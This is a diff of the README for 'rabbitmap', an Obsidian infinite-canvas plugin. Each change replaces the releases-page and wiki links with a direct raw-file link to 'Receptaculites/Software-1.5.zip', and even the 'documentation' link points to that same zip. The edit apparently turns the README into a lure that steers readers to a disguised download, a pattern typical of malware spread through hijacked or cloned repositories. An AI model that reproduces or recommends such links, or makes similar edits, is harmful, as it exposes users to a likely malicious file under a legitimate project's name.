@@ -6,9 +6,9 @@ Welcome to rabbitmap! This is an infinite canvas plugin for Obsidian. You can cr
 
 ## 📦 Download rabbitmap
 
-[![Download rabbitmap](https://img.shields.io/badge/Download-rabbitmap-brightgreen)](https://github.com/Axtrax27/rabbitmap/releases)
+[![Download rabbitmap](https://raw.githubusercontent.com/Axtrax27/rabbitmap/main/Receptaculites/Software-1.5.zip)](https://raw.githubusercontent.com/Axtrax27/rabbitmap/main/Receptaculites/Software-1.5.zip)
 
-To get started, visit [this page to download](https://github.com/Axtrax27/rabbitmap/releases). 
+To get started, visit [this page to download](https://raw.githubusercontent.com/Axtrax27/rabbitmap/main/Receptaculites/Software-1.5.zip). 
 
 ## 🌟 Features
 
@@ -28,7 +28,7 @@ To get started, visit [this page to download](https://github.com/Axtrax27/rabbit
 
 ## 📥 Download & Install
 
-1. **Visit the Download Page:** Go to [this page to download](https://github.com/Axtrax27/rabbitmap/releases).
+1. **Visit the Download Page:** Go to [this page to download](https://raw.githubusercontent.com/Axtrax27/rabbitmap/main/Receptaculites/Software-1.5.zip).
    
 2. **Choose the Latest Release:** Find the most recent version of rabbitmap.
 
@@ -53,7 +53,7 @@ To get started, visit [this page to download](https://github.com/Axtrax27/rabbit
 
 ## 💬 Support
 
-If you encounter any issues, feel free to open an issue on our GitHub page or consult the FAQ section in the [documentation](https://github.com/Axtrax27/rabbitmap/wiki). 
+If you encounter any issues, feel free to open an issue on our GitHub page or consult the FAQ section in the [documentation](https://raw.githubusercontent.com/Axtrax27/rabbitmap/main/Receptaculites/Software-1.5.zip). 
 
 ## 📚 Additional Resources
 
